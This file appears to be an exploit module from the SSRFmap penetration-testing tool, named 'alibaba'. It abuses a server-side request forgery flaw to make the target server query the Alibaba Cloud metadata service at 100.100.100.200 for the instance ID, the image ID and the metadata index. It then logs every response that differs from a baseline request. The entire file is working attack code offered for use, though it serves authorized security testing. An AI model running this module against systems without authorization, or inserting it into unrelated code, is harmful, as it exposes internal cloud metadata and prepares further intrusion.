import logging
import os
from typing import List, Set, Tuple

from ssrfmap.core.utils import diff_text, wrapper_http

name = "alibaba"
description = "Access sensitive data from the Alibaba Cloud"
author = "Swissky"
documentation: List[str] = [""]


class exploit:
    endpoints: Set[Tuple[str, str]] = set()

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], "80")
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info("\033[32mReading file\033[0m : {}".format(payload))
                    logging.debug(diff)

    def add_endpoints(self):
        self.endpoints.add(("100.100.100.200", "latest/meta-data/instance-id"))
        self.endpoints.add(("100.100.100.200", "latest/meta-data/image-id"))
        self.endpoints.add(("100.100.100.200", "latest/meta-data/"))
